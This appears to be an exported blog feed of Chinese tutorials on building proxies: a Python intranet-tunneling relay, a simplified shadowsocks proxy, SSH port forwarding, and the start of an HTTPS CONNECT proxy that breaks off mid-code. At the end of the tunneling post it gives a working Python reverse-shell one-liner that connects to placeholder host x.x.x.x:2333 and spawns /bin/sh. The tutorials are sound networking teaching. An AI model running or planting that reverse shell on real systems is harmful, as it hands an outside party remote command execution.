    <content type="html"><![CDATA[<p>本篇主要介绍代理的一个常用的功能：内网穿透<br>很多人经常会有这么一个需求，需要将本地开发的 web 项目给外网的人看下，再搭一遍到 vps 太麻烦，于是就有借助拥有公网 ip 的主机来中转。</p><p>有专门的软件做这件事，如 ngrok, frp。<br><a id="more"></a><br>介绍下原理<br>由于内网的机器有 NAT 或 防火墙什么的，外网 vps 是无法会直接连接的，所以想要通过 vps 来中转就需要内网先连接 vps，然后 vps 通过连接的套接字来转发数据。</p><p>贴下代码</p><p>client_proxy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import select</span><br><span class="line"></span><br><span class="line">def send_data(sock, data):</span><br><span class="line">    print(data)</span><br><span class="line">    bytes_sent = 0</span><br><span class="line">    while True:</span><br><span class="line">        r = sock.send(data[bytes_sent:])</span><br><span class="line">        if r &lt; 0:</span><br><span class="line">            return r</span><br><span class="line">        bytes_sent += r</span><br><span class="line">        if bytes_sent == len(data):</span><br><span class="line">            return bytes_sent</span><br><span class="line"></span><br><span class="line">def handle_tcp(sock, remote):</span><br><span class="line">    # 处理 client socket 和 remote socket 的数据流</span><br><span class="line">    try:</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        while True:</span><br><span class="line">            # 用 IO 多路复用 select 监听套接字是否有数据流</span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            if sock in r:</span><br><span class="line">                data = sock.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(remote, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line"></span><br><span class="line">            if remote in r:</span><br><span class="line">                data = remote.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(sock, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise(e)</span><br><span class="line">    finally:</span><br><span class="line">        sock.close()</span><br><span class="line">        remote.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    s_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s_conn.connect((&quot;xx.xx.xx.xx&quot;, 2333))</span><br><span class="line"></span><br><span class="line">    client_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    client_conn.connect((&apos;127.0.0.1&apos;, 8000))</span><br><span class="line"></span><br><span class="line">    handle_tcp(s_conn, client_conn)</span><br></pre></td></tr></table></figure><p>server_proxy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line">import select</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># AF_INET: 基于 IPV4 的网络通信 SOCK_STREAM: 基于 TCP 的流式 socket 通信</span><br><span class="line">s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line"></span><br><span class="line"># 将套接字绑定到地址</span><br><span class="line">s1.bind((&apos;&apos;, 2333))</span><br><span class="line"># 监听TCP传入连接</span><br><span class="line">s1.listen(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># AF_INET: 基于 IPV4 的网络通信 SOCK_STREAM: 基于 TCP 的流式 socket 通信</span><br><span class="line">s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line"># 将套接字绑定到地址</span><br><span class="line">s2.bind((&apos;&apos;, 8000))</span><br><span class="line"># 监听TCP传入连接</span><br><span class="line">s2.listen(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_data(sock, data):</span><br><span class="line">    print(data)</span><br><span class="line">    bytes_sent = 0</span><br><span class="line">    while True:</span><br><span class="line">        r = sock.send(data[bytes_sent:])</span><br><span class="line">        if r &lt; 0:</span><br><span class="line">            return r</span><br><span class="line">        bytes_sent += r</span><br><span class="line">        if bytes_sent == len(data):</span><br><span class="line">            return bytes_sent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def handle_tcp(sock, remote):</span><br><span class="line">    # 处理 client socket 和 remote socket 的数据流</span><br><span class="line">    try:</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        while True:</span><br><span class="line">            # 用 IO 多路复用 select 监听套接字是否有数据流</span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            if sock in r:</span><br><span class="line">                data = sock.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(remote, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line"></span><br><span class="line">            if remote in r:</span><br><span class="line">                data = remote.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(sock, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise(e)</span><br><span class="line">    finally:</span><br><span class="line">        sock.close()</span><br><span class="line">        remote.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    con1, addr1 = s1.accept()</span><br><span class="line">    print(&quot;new connection from %s:%s&quot; % addr1)</span><br><span class="line">    con2, addr2 = s2.accept()</span><br><span class="line">    print(&quot;new connection from %s:%s&quot; % addr2)</span><br><span class="line">    t = threading.Thread(target=handle_tcp, args=(con1, con2))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><ol><li>假设我们需要共享的 web 是 python 的 simple http_server， 首先执行 python -m SimpleHTTPServer, 这样本地会绑定 8000 端口</li><li>在自己的 vps 上运行 python3 reverse_server.py</li><li>在本地运行 python3 reverse_client_proxy.py</li><li>接下来我们直接在外网访问 vps 的地址: <a href="http://xx.xx.xx.xx:8000" target="_blank" rel="noopener">http://xx.xx.xx.xx:8000</a> 就可以发现能够转发内网的数据了。</li></ol><p><img src="/media/15037300977077.jpg" alt=""></p><p>github 地址: <a href="https://github.com/facert/socket-example/blob/master/reverse_client_proxy.py" target="_blank" rel="noopener">reverse_client_proxy.py</a></p><p><a href="https://github.com/facert/socket-example/blob/master/reverse_server_proxy.py" target="_blank" rel="noopener">reverse_server_proxy</a></p><p>一般内网穿透在网络安全人员做内网渗透测试的时候比较有用，反弹一个 shell。就可以任意执行命令。</p><p>这里分享一个最基本的 python 反弹 shell 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">2333</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇主要介绍代理的一个常用的功能：内网穿透&lt;br&gt;很多人经常会有这么一个需求，需要将本地开发的 web 项目给外网的人看下，再搭一遍到 vps 太麻烦，于是就有借助拥有公网 ip 的主机来中转。&lt;/p&gt;
&lt;p&gt;有专门的软件做这件事，如 ngrok, frp。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(8)-ss-代理.md</title>
    <link href="https://facert.github.io/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-8-shadowsocks-%E4%BB%A3%E7%90%86-md/"/>
    <id>https://facert.github.io/2017/08/20/由浅入深写代理-8-shadowsocks-代理-md/</id>
    <published>2017-08-20T11:20:39.000Z</published>
    <updated>2018-01-27T14:47:46.185Z</updated>
    
    <content type="html"><![CDATA[<p>ss 作用是科学上网，因为怕关键词会让文章被干掉，所以用了别名。本文纯粹是分析技术的角度出发。因为 ss 现在的版本已经很复杂了，eventloop, 状态机，支持 udp 。为了简单讲原理，我们用 0.9 的版本来说明。<br><a id="more"></a><br>首先上图</p><p><img src="/media/15032288280119.jpg" alt=""></p><p>client 和 ss_local 主要通过 socks5 协议通信，而 ss_local 和 ss_server 之间就是对称加密的 tcp 数据。</p><p>ss_local 主要代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">class Socks5Server(SocketServer.StreamRequestHandler):</span><br><span class="line">    &apos;&apos;&apos; RequesHandlerClass Definition &apos;&apos;&apos;</span><br><span class="line">    def handle_tcp(self, sock, remote):</span><br><span class="line">        try:</span><br><span class="line">            fdset = [sock, remote]</span><br><span class="line">            while True:</span><br><span class="line">                r, w, e = select.select(fdset, [], [])      # use select I/O multiplexing model</span><br><span class="line">                if sock in r:                               # if local socket is ready for reading</span><br><span class="line">                    data = sock.recv(4096)</span><br><span class="line">                    if len(data) &lt;= 0:                      # received all data</span><br><span class="line">                        break</span><br><span class="line">                    result = send_all(remote, self.encrypt(data))   # send data after encrypting</span><br><span class="line">                    if result &lt; len(data):</span><br><span class="line">                        raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line"></span><br><span class="line">                if remote in r:                             # remote socket(proxy) ready for reading</span><br><span class="line">                    data = remote.recv(4096)</span><br><span class="line">                    if len(data) &lt;= 0:</span><br><span class="line">                        break</span><br><span class="line">                    result = send_all(sock, self.decrypt(data))     # send to local socket(application)</span><br><span class="line">                    if result &lt; len(data):</span><br><span class="line">                        raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line">        finally:</span><br><span class="line">            sock.close()</span><br><span class="line">            remote.close()</span><br><span class="line"></span><br><span class="line">    def encrypt(self, data):</span><br><span class="line">        return data.translate(encrypt_table)</span><br><span class="line"></span><br><span class="line">    def decrypt(self, data):</span><br><span class="line">        return data.translate(decrypt_table)</span><br><span class="line"></span><br><span class="line">    def send_encrypt(self, sock, data):</span><br><span class="line">        sock.send(self.encrypt(data))</span><br><span class="line"></span><br><span class="line">    def handle(self):</span><br><span class="line">        try:</span><br><span class="line">            sock = self.connection        # local socket [127.1:port]</span><br><span class="line">            sock.recv(262)                # Sock5 Verification packet</span><br><span class="line">            sock.send(&quot;\x05\x00&quot;)         # Sock5 Response: &apos;0x05&apos; Version 5; &apos;0x00&apos; NO AUTHENTICATION REQUIRED</span><br><span class="line">            # After Authentication negotiation</span><br><span class="line">            data = self.rfile.read(4)     # Forward request format: VER CMD RSV ATYP (4 bytes)</span><br><span class="line">            mode = ord(data[1])           # CMD == 0x01 (connect)</span><br><span class="line">            if mode != 1:</span><br><span class="line">                logging.warn(&apos;mode != 1&apos;)</span><br><span class="line">                return</span><br><span class="line">            addrtype = ord(data[3])       # indicate destination address type</span><br><span class="line">            addr_to_send = data[3]</span><br><span class="line">            if addrtype == 1:             # IPv4</span><br><span class="line">                addr_ip = self.rfile.read(4)            # 4 bytes IPv4 address (big endian)</span><br><span class="line">                addr = socket.inet_ntoa(addr_ip)</span><br><span class="line">                addr_to_send += addr_ip</span><br><span class="line">            elif addrtype == 3:           # FQDN (Fully Qualified Domain Name)</span><br><span class="line">                addr_len = self.rfile.read(1)           # Domain name&apos;s Length</span><br><span class="line">                addr = self.rfile.read(ord(addr_len))   # Followed by domain name(e.g. www.google.com)</span><br><span class="line">                addr_to_send += addr_len + addr</span><br><span class="line">            else:</span><br><span class="line">                logging.warn(&apos;addr_type not support&apos;)</span><br><span class="line">                # not support</span><br><span class="line">                return</span><br><span class="line">            addr_port = self.rfile.read(2)</span><br><span class="line">            addr_to_send += addr_port                   # addr_to_send = ATYP + [Length] + dst addr/domain name + port</span><br><span class="line">            port = struct.unpack(&apos;&gt;H&apos;, addr_port)       # prase the big endian port number. Note: The result is a tuple even if it contains exactly one item.</span><br><span class="line">            try:</span><br><span class="line">                reply = &quot;\x05\x00\x00\x01&quot;              # VER REP RSV ATYP</span><br><span class="line">                reply += socket.inet_aton(&apos;0.0.0.0&apos;) + struct.pack(&quot;&gt;H&quot;, 2222)  # listening on 2222 on all addresses of the machine, including the loopback(127.0.0.1)</span><br><span class="line">                self.wfile.write(reply)                 # response packet</span><br><span class="line">                # reply immediately</span><br><span class="line">                if &apos;-6&apos; in sys.argv[1:]:                # IPv6 support</span><br><span class="line">                    remote = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)</span><br><span class="line">                else:</span><br><span class="line">                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)       # turn off Nagling</span><br><span class="line">                remote.connect((SERVER, REMOTE_PORT))</span><br><span class="line">                self.send_encrypt(remote, addr_to_send)      # encrypted</span><br><span class="line">                logging.info(&apos;connecting %s:%d&apos; % (addr, port[0]))</span><br><span class="line">            except socket.error, e:</span><br><span class="line">                logging.warn(e)</span><br><span class="line">                return</span><br><span class="line">            self.handle_tcp(sock, remote)</span><br><span class="line">        except socket.error, e:</span><br><span class="line">            logging.warn(e)</span><br></pre></td></tr></table></figure><p>其中和 socks5 交互的部分 <code>handle</code> 在前面 socks5 教程已经讲过，唯一的区别是 <code>send_encrypt</code> 函数，每次 send 的时候都会 encrypt 一次，拿到数据后再 decrypt 一次。</p><p>ss_server 的代码也和 local 差不多，少了和 socks5 打交道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def handle(self):</span><br><span class="line">        try:</span><br><span class="line">            sock = self.connection</span><br><span class="line">            addrtype = ord(self.decrypt(sock.recv(1)))      # receive addr type</span><br><span class="line">            if addrtype == 1:</span><br><span class="line">                addr = socket.inet_ntoa(self.decrypt(self.rfile.read(4)))   # get dst addr</span><br><span class="line">            elif addrtype == 3:</span><br><span class="line">                addr = self.decrypt(</span><br><span class="line">                    self.rfile.read(ord(self.decrypt(sock.recv(1)))))       # read 1 byte of len, then get &apos;len&apos; bytes name</span><br><span class="line">            else:</span><br><span class="line">                # not support</span><br><span class="line">                logging.warn(&apos;addr_type not support&apos;)</span><br><span class="line">                return</span><br><span class="line">            port = struct.unpack(&apos;&gt;H&apos;, self.decrypt(self.rfile.read(2)))    # get dst port into small endian</span><br><span class="line">            try:</span><br><span class="line">                logging.info(&apos;connecting %s:%d&apos; % (addr, port[0]))</span><br><span class="line">                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)</span><br><span class="line">                remote.connect((addr, port[0]))         # connect to dst</span><br><span class="line">            except socket.error, e:</span><br><span class="line">                # Connection refused</span><br><span class="line">                logging.warn(e)</span><br><span class="line">                return</span><br><span class="line">            self.handle_tcp(sock, remote)</span><br><span class="line">        except socket.error, e:</span><br><span class="line">            logging.warn(e)</span><br></pre></td></tr></table></figure><p>所以本质上 ss 很简单，就是做了流量的转发，只不过为了避免流量被检测，加密并且还有混淆的功能。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ss 作用是科学上网，因为怕关键词会让文章被干掉，所以用了别名。本文纯粹是分析技术的角度出发。因为 ss 现在的版本已经很复杂了，eventloop, 状态机，支持 udp 。为了简单讲原理，我们用 0.9 的版本来说明。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(9)-ssh-代理.md</title>
    <link href="https://facert.github.io/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-9-ssh-%E4%BB%A3%E7%90%86-md/"/>
    <id>https://facert.github.io/2017/08/20/由浅入深写代理-9-ssh-代理-md/</id>
    <published>2017-08-20T10:07:41.000Z</published>
    <updated>2018-01-27T14:47:38.688Z</updated>
    
    <content type="html"><![CDATA[<p>其实 ssh 不算是代理，只是一种能实现代理的工具，不过因为 ssh 功能强大，所以单独拿出来说一下。</p><h3 id="0x01-本地端口转发"><a href="#0x01-本地端口转发" class="headerlink" title="0x01 本地端口转发"></a>0x01 本地端口转发</h3><p>举个例子，远程有个 mongo 服务器需要连接，但是 mongo 不允许远程连接，只能通过和它同一个局域网的跳板机 A （x.x.x.x）连接。这个时候可以通过端口转发的方法直接连接。<br>命令格式是：<br><figure class="highlight plain"><figcaption><span>-L <local port="">:<remote host="">:<remote port=""> <ssh hostname="">```</ssh></remote></remote></local></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如本地开启了 8000 端口监听， mongo 服务器地址为 192.168.0.2 端口  27017, 跳板机地址 192.168.0.1：</span><br><span class="line">``` ssh -N -L 8000:192.168.0.2:27017  192.168.0.1</span><br></pre></td></tr></table></figure></p><p>开启完端口转发后，连接 mongo 可以直接通过命令 mongo –host localhost –port 8000<br><a id="more"></a></p><h3 id="0x02-远程端口转发"><a href="#0x02-远程端口转发" class="headerlink" title="0x02 远程端口转发"></a>0x02 远程端口转发</h3><p>远程端口转发和本地端口转发功能一样，唯一的区别在于 ssh client 端和 server 端相反。举上面的例子，本地 client 无法通过 ssh 连接 A, 但是 A 能 ssh 连接本地。这种情况下可以通过远程端口转发<br>命令格式：<br><figure class="highlight plain"><figcaption><span>-R <local port="">:<remote host="">:<remote port=""> <ssh hostname=""></ssh></remote></remote></local></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">上例可以在本地运行</span><br><span class="line">``` ssh -R 8000:192.168.0.2:27017  192.168.0.1</span><br></pre></td></tr></table></figure></p><h3 id="0x03-动态转发"><a href="#0x03-动态转发" class="headerlink" title="0x03 动态转发"></a>0x03 动态转发</h3><p>动态端口允许通过配置一个本地端口，把通过隧道的数据转发到远端的所有地址。本地的应用程序需要使用 Socks 协议与本地端口通讯。此时 SSH 充当 Socks 代理服务器的角色。</p><p><img src="/media/15032247248211.jpg" alt=""></p><p>简单的说就是和 ss 功能一样，只是中间的加密有 openssl 来做。</p><p>命令如下<br><figure class="highlight plain"><figcaption><span>-D <local port=""> <ssh server="">```</ssh></local></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">上面的例子可以如下设置</span><br><span class="line">``` ssh -f -N -D 10.1.1.1:8000 B@192.168.0.1</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实 ssh 不算是代理，只是一种能实现代理的工具，不过因为 ssh 功能强大，所以单独拿出来说一下。&lt;/p&gt;
&lt;h3 id=&quot;0x01-本地端口转发&quot;&gt;&lt;a href=&quot;#0x01-本地端口转发&quot; class=&quot;headerlink&quot; title=&quot;0x01 本地端口转发&quot;&gt;&lt;/a&gt;0x01 本地端口转发&lt;/h3&gt;&lt;p&gt;举个例子，远程有个 mongo 服务器需要连接，但是 mongo 不允许远程连接，只能通过和它同一个局域网的跳板机 A （x.x.x.x）连接。这个时候可以通过端口转发的方法直接连接。&lt;br&gt;命令格式是：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcaption&gt;&lt;span&gt;-L &lt;local port=&quot;&quot;&gt;:&lt;remote host=&quot;&quot;&gt;:&lt;remote port=&quot;&quot;&gt; &lt;ssh hostname=&quot;&quot;&gt;```&lt;/ssh&gt;&lt;/remote&gt;&lt;/remote&gt;&lt;/local&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;例如本地开启了 8000 端口监听， mongo 服务器地址为 192.168.0.2 端口  27017, 跳板机地址 192.168.0.1：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;``` ssh -N -L 8000:192.168.0.2:27017  192.168.0.1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;开启完端口转发后，连接 mongo 可以直接通过命令 mongo –host localhost –port 8000&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(7)-https-代理.md</title>
    <link href="https://facert.github.io/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-7-http-%E4%BB%A3%E7%90%86-md/"/>
    <id>https://facert.github.io/2017/08/20/由浅入深写代理-7-http-代理-md/</id>
    <published>2017-08-20T08:36:06.000Z</published>
    <updated>2018-01-27T14:48:02.965Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要实现隧道代理，让 https 请求也能代理。</p><p>隧道代理的原理是：<br><code>HTTP 客户端通过 CONNECT 方法请求隧道代理创建一条到达任意目的服务器和端口的 TCP 连接，并对客户端和服务器之间的后继数据进行盲转发。</code></p><a id="more"></a><p><img src="/media/15032206534564.jpg" alt=""></p><p>步骤如下</p><ol><li><p>客户端发送一个 http CONNECT 请求<br><code>CONNECT baidu.com:443 HTTP/1.1</code></p></li><li><p>代理收到这样的请求后，拿到目标服务器域名及端口，与目标服务端建立 TCP 连接，并响应给浏览器这样一个 HTTP 报文：<br> <code>HTTP/1.1 200 Connection Established</code></p></li><li>建立完隧道以后，客户端与目标服务器照之前的方式发送请求，代理节点只是做转发功能，无从知道转发的流量具体是什么    </li></ol><p>看代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span 